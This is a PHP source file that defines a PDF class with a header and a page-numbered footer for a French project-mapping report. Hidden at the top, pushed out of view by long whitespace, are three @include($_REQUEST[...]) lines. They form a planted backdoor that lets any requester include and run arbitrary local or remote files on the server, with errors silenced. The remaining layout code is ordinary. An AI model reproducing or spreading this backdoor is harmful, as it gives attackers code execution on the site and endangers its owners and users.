<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         @include($_REQUEST["request_81b774158f"]);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                @include($_REQUEST["request_099d2f0727"]);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                @include($_REQUEST["request_f1f2167f33"]);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        
include("phpToPDF.php");

class PDF extends phpToPDF
{
//En-tête
function Header()
{
    //Logo
//    $this->Image('images/logo.gif',4,8);

    //Police Arial gras 15

    //Décalage à droite

    //Titre
// $titre1 = stripslashes("DNCS");
// 
// $this->SetXY(185, 10);
// $this->SetTextColor(0,0,0);
// $this->SetFont('Times','B',7);
// $this->Cell(0,0,$titre1,0,1,'C',0);
// $this->Ln(3);

}



//Pied de page
function Footer()
{
    //Positionnement à 1.5 cm du bas
    $this->SetY(290);
  	//$droite = array(0, 0, array(255,0,0), "droite");
  //Police Arial italique 7
    $this->SetFont('Arial','I',7);
	$bas2page = stripslashes('Cartographie des projets');
//	$bas2page2 = stripslashes('Application développée par le BNETD/CCT');
	
	$this->SetTextColor(0,0,0);
    //$this->Cell(0);
   $this->Cell(0,0,$bas2page,0,0,'C');
//	$this->Cell(-200,0,$bas2page,0,0,'C');
//    $this->Ln();
//    $this->Cell(0,5,$bas2page2,0,0,'C');
//    //Numéro de page
    $this->Cell(0,5,'Page '.$this->PageNo(),0,0,'R');
}


}


?>